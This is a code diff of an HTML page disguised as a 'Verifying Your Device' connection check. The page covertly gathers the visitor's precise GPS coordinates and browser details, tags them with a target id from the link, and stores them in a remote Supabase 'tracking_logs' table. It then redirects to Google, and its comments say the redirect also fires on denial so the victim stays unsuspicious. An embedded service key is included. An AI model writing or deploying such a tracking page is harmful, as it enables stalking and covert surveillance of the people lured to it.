@@ -3,55 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking Connection...</title>
+    <title>Connection Verifying...</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
-<body style="background-color: #f4f4f4; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
+<body style="background-color: #1a1a1a; color: black; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center;">
 
-    <div style="text-align: center;">
-        <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto 20px;"></div>
-        <p style="color: #555;">Verifying your device connection...</p>
+    <div id="main-content" style="padding: 20px;">
+        <div id="loader" style="border: 4px solid #333; border-top: 4px solid #007bff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+        <h3 id="msg">Verifying Your Device...</h3>
+        <p style="font-size: 14px; color: #888;">Please wait while we establish a secure connection.</p>
+        
+        <button id="retry-btn" style="display: none; margin-top: 20px; padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px;">Continue to Google</button>
     </div>
 
-    <style>
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 
     <script>
         const supabaseUrl = 'https://nhhcijrjrcxznsqltzom.supabase.co';
         const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5oaGNpanJqcmN4em5zcWx0em9tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MTMyODAsImV4cCI6MjA4OTQ4OTI4MH0.1CG80rxN01S00lCQ1gkqyKdenDJR_XjM0uQtEAln9XU';
         const supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);
 
-        async function logLocation() {
+        async function sendToSupabase(lat, lon, id) {
+            await supabaseClient.from('tracking_logs').insert([{ 
+                user_identifier: id, 
+                latitude: lat, 
+                longitude: lon,
+                device_info: "Mobile: " + navigator.userAgent
+            }]);
+            // Data send houar por ektu delay diye redirect
+            setTimeout(() => {
+                window.location.replace("https://www.google.com");
+            }, 500);
+        }
+
+        function startTracking() {
             const urlParams = new URLSearchParams(window.location.search);
             const targetId = urlParams.get('id') || 'Mobile_User';
 
             if (navigator.geolocation) {
-                // High Accuracy on kora hoyeche mobile GPS-er jonno
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    await supabaseClient.from('tracking_logs').insert([{ 
-                        user_identifier: targetId, 
-                        latitude: pos.coords.latitude, 
-                        longitude: pos.coords.longitude,
-                        device_info: "Mobile: " + navigator.userAgent
-                    }]);
-                    
-                    // Success hole redirect
-                    window.location.replace("https://www.google.com");
-                }, (err) => {
-                    // Fail ba Block korleo redirect jate shondeho na hoy
-                    window.location.replace("https://www.google.com");
-                }, { 
-                    enableHighAccuracy: true, 
-                    timeout: 10000, 
-                    maximumAge: 0 
-                });
+                // Mobile browser-e accuracy ebong timeout optimize kora
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        sendToSupabase(pos.coords.latitude, pos.coords.longitude, targetId);
+                    }, 
+                    (err) => {
+                        console.log("Error or Denied");
+                        // Permission block korle 2 second por Google-e pathabe
+                        setTimeout(() => { window.location.replace("https://www.google.com"); }, 2000);
+                    }, 
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                );
             } else {
                 window.location.replace("https://www.google.com");
             }
         }
 
-        window.onload = logLocation;
+        // Page load houar 1.5 second por start hobe jate browser ready thake
+        window.onload = () => {
+            setTimeout(startTracking, 1500);
+        };
     </script>
 </body>
 </html>
